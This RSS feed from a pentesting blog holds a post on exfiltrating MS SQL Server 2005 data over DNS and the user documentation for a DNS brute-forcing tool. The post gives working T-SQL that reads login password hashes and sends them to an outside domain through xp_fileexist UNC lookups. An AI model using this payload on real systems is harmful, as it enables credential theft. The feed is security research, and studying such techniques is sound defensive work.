<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>dns &#8211; pentestmonkey</title>
	<atom:link href="https://pentestmonkey.net/tag/dns/feed" rel="self" type="application/rss+xml" />
	<link>https://pentestmonkey.net</link>
	<description>Taking the monkey work out of pentesting</description>
	<lastBuildDate>Wed, 31 Aug 2011 16:10:28 +0000</lastBuildDate>
	<language>en-US</language>
	<sy:updatePeriod>
	hourly	</sy:updatePeriod>
	<sy:updateFrequency>
	1	</sy:updateFrequency>
	<generator>https://wordpress.org/?v=5.8.3</generator>
	<item>
		<title>Exfiltrating Data From MS SQL Server Via DNS</title>
		<link>https://pentestmonkey.net/blog/mssql-dns</link>
					<comments>https://pentestmonkey.net/blog/mssql-dns#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sun, 08 Apr 2007 18:59:47 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[dns]]></category>
		<category><![CDATA[mssql]]></category>
		<category><![CDATA[pentest]]></category>
		<category><![CDATA[sqlinjection]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=8</guid>

					<description><![CDATA[Exfiltrating data via Blind SQL Injection vulnerabilities can be slow, or the very least undesirably noisy. DNS may provide a faster alternative if the target system is connected to the Internet. Below are some notes I made on exfiltrating data from MS SQL Server 2005. Preamble Why Blind SQL Injection can be a Pain Since [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>Exfiltrating data via <a href="http://www.spidynamics.com/whitepapers/Blind_SQLInjection.pdf">Blind SQL Injection</a> vulnerabilities can be slow, or the very least undesirably noisy. DNS may provide a faster alternative if the target system is connected to the Internet.<br />
<span id="more-8"></span></p>
<p>Below are some notes I made on exfiltrating data from MS SQL Server 2005.</p>
<h2>Preamble</h2>
<h3>Why Blind SQL Injection can be a Pain</h3>
<p>Since the injection is blind, you don&#8217;t have the luxury of getting data out fast with a UNION SELECT, or using MS SQL server error messages.</p>
<p>Depending on your definition of &#8220;Blind SQL Injection&#8221; you might be able to use differing responses from the app to extract data 1 bit at time by asking &#8220;yes or no&#8221; questions. In the worst case, you&#8217;ll have to use something like <a href="http://msdn2.microsoft.com/en-us/library/ms187331.aspx">WAITFOR DELAY</a> or <a href="http://dev.mysql.com/doc/refman/5.0/en/information-functions.html#function_benchmark">BENCHMARK</a> to painstakingly extract data in a bitwise fashion.</p>
<p>Even with the help of automated tools, this process can be slow. Owing to the fact you normally need 1 request for each bit of data you extract, you&#8217;ll typically need hundreds or even thousands of queries. Traditional exploitation of blind SQL injection is therefore a very noisy attack.</p>
<h3>Some Potential Alternatives</h3>
<p>There may not be any other options open to you, but if you&#8217;re lucky there&#8217;ll be a shortcut. For example you might be able to:</p>
<ul>
<li>open a database connection from the backend database to a database you control.</li>
<li>export data to a file and read the file back by some other means.</li>
<li>write data of interest to another part of the database you can read (e.g. change the first line of your address to be the admin&#8217;s password hash).</li>
<li>to embed the answer to your SQL queries in a DNS request.</li>
</ul>
<h2>Using DNS to Exfiltrate Data</h2>
<p>DNS requests are arguably more likely to be allowed out from the database server to arbitrary hosts on the Internet than any other query. Even if the Firewall is doing its job properly and preventing the database server from sending data <em>directly</em>to the internet, a DNS request originating from the server may still be allowed out via an internal DNS server.</p>
<p>Our challenge is simply to embed the result of our SQL query in the DNS request and to capture it when it makes its way onto the Internet.</p>
<p>Conceptually what we&#8217;re trying to achieve with our SQL injection is something like the following:</p>
<pre>   do_dns_lookup( (select top 1 password from users) + '.pentestmonkey.net' );</pre>
<p>We want to use a SELECT statement to obtain the password hash we&#8217;re interested in, append a domain name which we control to the end of it (e.g. pentestmonkey.net). Finally we perform a DNS lookup (address-record lookup for a fictitious hostname). We then run a packet sniffer on the name server for our domain and wait for the DNS record containing our hash.</p>
<pre>   someserver.example.com.1234 &gt; ns.pentestmonkey.net.53 A? 0x1234ABCD.pentestmonkey.net</pre>
<p>The string &#8220;0x1234ABCD&#8221; here represents the password hash we hope to extract using our SELECT statement. In his recent <a href="http://eu.wiley.com/WileyCDA/WileyTitle/productCd-0470080221.html">book</a>, David Litchfield talks about how to use UTL_INADDR on Oracle to exfiltrate password hashes via DNS. The rest of this blog entry contains the notes I made while trying to apply the same technique to SQL Server 2005</p>
<h2>Using DNS to Exfiltrate Data from SQL Server 2005</h2>
<p>So far I&#8217;ve only figured out how to do this given database administrator level credentials. The following examples assumes you&#8217;ve already have this level of privilege (e.g. from your sql injection).</p>
<p>Several stored procedures can take hostnames as arguments (usually as UNC paths). The ones I&#8217;ve looked at so far are:</p>
<ul>
<li>bulk insert mytable from &#8216;\somehostshare$file&#8217;;</li>
<li>xp_fileexist &#8216;\somehostshare$file&#8217;;</li>
</ul>
<p>Both are available to database admins by default on SQL Server 2005. Note that xp_fileexist doesn&#8217;t throw an error if your privileges are too low. If you don&#8217;t have sufficient privileges, xp_fileexist always returns a &#8220;file doesn&#8217;t exist&#8221; type response without actually processing the filename.  If you&#8217;re using SQL Server 2000 try xp_getfiledetails as this can be run by non-priv users.</p>
<p>I had some problems when I tried to include variable data as part of the hostname. Concatenation and subselects seem to be disallowed in most places where you&#8217;d want it:</p>
<ul>
<li>bulk insert mytable from &#8216;\&#8217; + &#8216;yourdatahere&#8217; + &#8216;share$file; &#8212; doesn&#8217;t work</li>
<li>exec(&#8216;xp_fileexist &#8221;\&#8217; + (select top 1 password from users) + &#8221;&#8217;share$file&#8221;&#8217;; &#8212; doesn&#8217;t work</li>
</ul>
<p>I was left with the following rather cumbersome example.</p>
<pre>   declare @host varchar(800);</pre>
<pre>  select @host = name + '-' + master.sys.fn_varbintohexstr(password_hash) + '.2.pentestmonkey.net' from sys.sql_logins;</pre>
<pre>  exec('xp_fileexist ''\' + @host + 'c$boot.ini''');</pre>
<p>It works, though. Here&#8217;s the DNS query observed from the pentestmonkey.net name server:</p>
<pre>   11:30:07.276608 IP 10.0.0.1.1605 &gt; 10.0.0.2.53:  3662+ A? sa-0x01004086ceb6370f972f9c9125fb8919e8078b3f3c3df37efdf0.2.pentestmonkey.net. (95)</pre>
<p>Note: Failed lookups seem to get cached, so the same SQL query won&#8217;t produce the same DNS query twice. To make sure that each query is different you can use a unique ID in the hostname (e.g. the &#8220;.2.&#8221; in the example above).</p>
<p>Since the hash is 52 bytes long (416-bits), this simple DNS trick just saved us 416 queries traditionally required to exfiltrate the hash using &#8220;yes or no&#8221; queries.</p>
<h2>How much data can go in a DNS request?</h2>
<p>This will probably depend on multiple factors such as the function to which the hostname is passed, and any length limitations imposed by nameservers which process the query before we see it.</p>
<p>In the case of MS SQL Server 2005 running on Windows 2003 I noticed two limitations:</p>
<p>1: No more that 63 characters are allowed for any subdomain / hostname section. The following is therefore the longest hostname I could form using only 2 dots:</p>
<pre>   123456789012345678901234567890123456789012345678901234567890123.pentestmonkey.net</pre>
<p>I was not able to add more data by using a domain name shorter than &#8220;pentestmonkey.net&#8221;.</p>
<p>2: The total length of the hostname seems to be capped at 248 characters</p>
<p>Some of this cannot contain useful data (i.e. a certain number of dots are required, and the domain name itself &#8220;pentestmonkey.net&#8221; does not contain any useful data). In the case of my domain, it was possible to store a maximum of 227 bytes of data in a DNS request.</p>
<pre>   012345678911234567892123456789312345678941234567895123456789612. 01234567891123456789212345678931234567894123456789512345678961b. 01234567891123456789212345678931234567894123456789512345678961c. 12345678901234567890123456789012345678.pentestmonkey.com.</pre>
<p>In this case, a shorter domain name DOES allow you to send more data.</p>
<p>The difficulty is that very long hostnames like this one seem to need a dot every 64 characters. This is something you&#8217;d need to concern yourself with while creating the hostname string within the SQL injection.</p>
<p>&nbsp;</p>
<h2>Feedback</h2>
<p>Please feel free to <a href="mailto:pentestmonkeyAATTpentestmonkey.net">mail</a> me if you think any of this is in error, or if you can offer any refinements.</p>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/blog/mssql-dns/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>dns-grind</title>
		<link>https://pentestmonkey.net/tools/misc/dns-grind</link>
					<comments>https://pentestmonkey.net/tools/misc/dns-grind#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sun, 15 Oct 2006 14:59:53 +0000</pubDate>
				<category><![CDATA[Misc]]></category>
		<category><![CDATA[discover]]></category>
		<category><![CDATA[dns]]></category>
		<category><![CDATA[dnsgrind]]></category>
		<category><![CDATA[domain]]></category>
		<category><![CDATA[enumerate]]></category>
		<category><![CDATA[fast]]></category>
		<category><![CDATA[host]]></category>
		<category><![CDATA[hostname]]></category>
		<category><![CDATA[ip]]></category>
		<category><![CDATA[nameserver]]></category>
		<category><![CDATA[ns]]></category>
		<category><![CDATA[pentest]]></category>
		<category><![CDATA[ptr]]></category>
		<category><![CDATA[query]]></category>
		<category><![CDATA[scan]]></category>
		<category><![CDATA[tool]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=114</guid>

					<description><![CDATA[Tool for performing lots of DNS queries quickly. Download dns-grind v1.0 here. SHA1sum: db2beb7ca6caf4343f81936d78617f02b87da024 MD5sum: f145a5acf5cc53507d9be147adbe384e User documentation is also available in PDF format. &#160; dns-grind User Documentation &#160; Contents Overview Installation Usage Some Examples Bruteforcing Hostnames (A-record Lookups) Finding Registered Domains (NS-record Lookups) Finding Interesting Hosts In An IP Range (PTR-record Lookups) License &#160; Overview [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>Tool for performing lots of DNS queries quickly.</p>
<p>Download dns-grind v1.0 <a href="/tools/dns-grind/dns-grind-1.0.tar.gz">here</a>.</p>
<p>SHA1sum: db2beb7ca6caf4343f81936d78617f02b87da024</p>
<p>MD5sum: f145a5acf5cc53507d9be147adbe384e</p>
<p>User documentation is also available in <a href="/tools/dns-grind/dns-grind-user-docs.pdf">PDF</a> format.</p>
<p><span id="more-114"></span></p>
<p>&nbsp;</p>
<h1 align="center">dns-grind User Documentation</h1>
<p>&nbsp;</p>
<h2><a title="SECTION00010000000000000000" name="SECTION00010000000000000000"></a> Contents</h2>
<ul>
<li><a title="tex2html14" name="tex2html14" href="dns-grind-user-docs.html#SECTION00020000000000000000"></a>Overview</li>
<li><a title="tex2html15" name="tex2html15" href="dns-grind-user-docs.html#SECTION00030000000000000000"></a>Installation</li>
<li><a title="tex2html16" name="tex2html16" href="dns-grind-user-docs.html#SECTION00040000000000000000"></a>Usage</li>
<li><a title="tex2html17" name="tex2html17" href="dns-grind-user-docs.html#SECTION00050000000000000000"></a>Some Examples
<ul>
<li><a title="tex2html18" name="tex2html18" href="dns-grind-user-docs.html#SECTION00051000000000000000"></a>Bruteforcing Hostnames (A-record Lookups)</li>
<li><a title="tex2html19" name="tex2html19" href="dns-grind-user-docs.html#SECTION00052000000000000000"></a>Finding Registered Domains (NS-record Lookups)</li>
<li><a title="tex2html20" name="tex2html20" href="dns-grind-user-docs.html#SECTION00053000000000000000"></a>Finding Interesting Hosts In An IP Range (PTR-record Lookups)</li>
</ul>
</li>
<li><a title="tex2html21" name="tex2html21" href="dns-grind-user-docs.html#SECTION00060000000000000000"></a>License</li>
</ul>
<p>&nbsp;</p>
<h1><a title="SECTION00020000000000000000" name="SECTION00020000000000000000"></a>Overview</h1>
<p>dns-grind is a tool for performs lots of DNS queries quickly. In particular:</p>
<p>&nbsp;</p>
<ol>
<li>Bruteforce guessing of hostnames within a domain, e.g. if foobar.com doesn&#8217;t allow zone transfers, you can dns-grind to start guessing hostnames: www.foobar.com, test.foobar.com, ftp.foobar.com, etc.</li>
<li>Quickly search a list of potential domain names for those that have name servers, e.g. If you&#8217;re testing for Foobar Enterprises Ltd, might want to search a list of domain like foobar.ac, foobar.ad, etc.</li>
<li>Look for interesting hosts in a list of IP addresses by searching for PTR records &#8211; the manual equivalent of &#8216;dig -x 10.0.0.1&#8217;, &#8216;dig -x 10.0.0.2&#8217;, etc.</li>
</ol>
<p>You can instruct dns-grind to only query a specific nameserver you&#8217;re testing, or to act like a normal DNS client and use the DNS configuration from your OS.</p>
<p>You can pass it a simple list of records to look up or you can give prefixes (e.g. www, test, ftp, &#8230;) and suffixes (foobar.com, foo-bar.com). The examples below should make this a bit clearer.</p>
<h1><a title="SECTION00030000000000000000" name="SECTION00030000000000000000"></a>Installation</h1>
<p>dns-grind is just a stand alone PERL script, so installation is as simple as copying it to your path. It has only been tested under Linux so far.</p>
<p>It depends on the following PERL modules which you may need to install first:</p>
<ul>
<li>Net::DNS</li>
<li>Socket</li>
<li>IO::Handle</li>
<li>IO::Select</li>
<li>Getopt::Std</li>
</ul>
<p>If you have PERL installed, you should be able to install the modules from CPAN:</p>
<pre> # perl -MCPAN -e shell
 cpan&gt; install Net::DNS</pre>
<h1><a title="SECTION00040000000000000000" name="SECTION00040000000000000000"></a>Usage</h1>
<p>dns-grind should first be passed either a file of records to look up or a combination of prefixes and suffixes. The last parameter should be passed is the DNS query type. Only a few are supported currently.</p>
<pre> Usage: ./dns-grind.pl -f file | (( -p prefix | -P file ) | ( -s suffix | -S file )) query-type 

 query-type is one of:
         A
         NS
         MX
         PTR 

 options are:
         -m n     Maximum number of resolver processes (default: 25)
         -p       Prefix of hostname or domain
         -P file  File of hostname or domain prefixes
         -s       Suffix of hostname or domain
         -S file  File of hostname of domain suffixes
         -f       File of hostnames or domains
         -n host  Nameserver to use (default: determined by OS)
         -d       Debugging output
         -r 0|1   Use recursive queries (default: 1)
         -t n     Wait a maximum of n seconds for reply (default: 5)
         -v       Verbose
         -h       This help message</pre>
<p>Note the -m option above. Generally speaking you want at least 25 query processes running because DNS lookup can be slow if done sequentially by a low number of processes. Be aware that this tool can stress your local recursive DNS server. I&#8217;ve known the DNS service on ADSL routers to fall over if -m is set too high.</p>
<p>If you want to stress a different DNS server instead, use the -n option.</p>
<h1><a title="SECTION00050000000000000000" name="SECTION00050000000000000000"></a>Some Examples</h1>
<h2><a title="SECTION00051000000000000000" name="SECTION00051000000000000000"></a> Bruteforcing Hostnames (A-record Lookups)</h2>
<p>In the example below, we use a file of hostname prefixes (with &#8216;-P&#8217; for prefix option) and a domain, pentestmonkey.net (with the &#8216;-s&#8217; for suffix option). A single A-record is found.</p>
<pre> $ cat hostname-prefixes.txt
 alpha
 backup
 cray
 ...
 $ dns-grind.pl -P hostname-prefixes.txt -s pentestmonkey.net A
 www.pentestmonkey.net	213.165.240.11</pre>
<p>NB: Wildcard A-records may ruin your search, but you could always &#8216;grep -v wildcard-ip&#8217; as a workaround.</p>
<p>A variant of this scan would be to look for subdomains by replacing hostname-prefixes.txt with subdomain-prefixes.txt (us, uk, hq, intranet, etc.) and searching for NS-records instead of A-records.</p>
<h2><a title="SECTION00052000000000000000" name="SECTION00052000000000000000"></a> Finding Registered Domains (NS-record Lookups)</h2>
<p>The premise for this search is that only registered domains have corresponding NS records. The real-world example below shows that this method kinda works, but needs a little refinement.</p>
<p>We supply a prefix of &#8216;pentestmonkey&#8217; with the &#8216;-p&#8217; option, and a file of potential suffixes <a title="tex2html1" name="tex2html1" href="#foot25"></a><sup>1</sup> with the -S option. Note the captial letter in -S or -P to signify a file option, and lowercase -p or -s for a single prefix or suffix<a title="tex2html2" name="tex2html2" href="#foot26"></a><sup>2</sup>.</p>
<pre> $ cat tlds.txt
 ac
 ad
 ae
 ... 

 $ dns-grind.pl -p pentestmonkey -S tlds.txt  ns
 pentestmonkey.mp        ns1.sdcdns.mp,ns2.sdcdns.mp
 pentestmonkey.vg
 pentestmonkey.sh        ns1c.nic.ac,ns2c.nic.ac
 pentestmonkey.net       ns0.nl.ev6.net,ns0.uk.ev6.net
 pentestmonkey.com       ns0.nl.ev6.net,ns0.uk.ev6.net,ns1.uk.ev6.net
 pentestmonkey.ac        ns1c.nic.ac,ns2c.nic.ac
 pentestmonkey.io        ns1c.nic.ac,ns2c.nic.ac
 pentestmonkey.tm        ns1c.nic.ac,ns2c.nic.ac
 pentestmonkey.org       ns0.uk.ev6.net,ns1.uk.ev6.net,ns0.nl.ev6.net</pre>
<p>After a bit of further investigation we find that there&#8217;s a wildcard NS record for any domain ending in .mp, .sh, .ac, .io, or .tm. These results are effectively false-positives. As is .vg for which a CNAME is returned when we look up the NS record.</p>
<p>The only registered domains with a prefix of &#8216;pentestmonkey&#8217; are therefore .com, .net and .org.</p>
<h2><a title="SECTION00053000000000000000" name="SECTION00053000000000000000"></a> Finding Interesting Hosts In An IP Range (PTR-record Lookups)</h2>
<p>Simply supply a list of IP addresses with the -f option. Below we use the genip<a title="tex2html3" name="tex2html3" href="#foot30"></a><sup>3</sup>tool to generate a list of IPs first.</p>
<pre> $ genip 10.0.0.0/24 &gt; ips.txt
 $ dns-grind.pl -f ips.txt PTR
 10.0.0.10	www.example.com
 10.0.0.99	manager.example.com</pre>
<h1><a title="SECTION00060000000000000000" name="SECTION00060000000000000000"></a>License</h1>
<p>This tool may be used for legal purposes only. Users take full responsibility for any actions performed using this tool. The author accepts no liability for damage caused by this tool. If these terms are not acceptable to you, then do not use this tool.</p>
<p>In all other respects the GPL version 2 applies:</p>
<pre> This program is free software; you can redistribute it and/or modify
 it under the terms of the GNU General Public License version 2 as
 published by the Free Software Foundation. 

 This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU General Public License for more details. 

 You should have received a copy of the GNU General Public License along
 with this program; if not, write to the Free Software Foundation, Inc.,
 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.</pre>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/tools/misc/dns-grind/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
	</channel>
</rss>
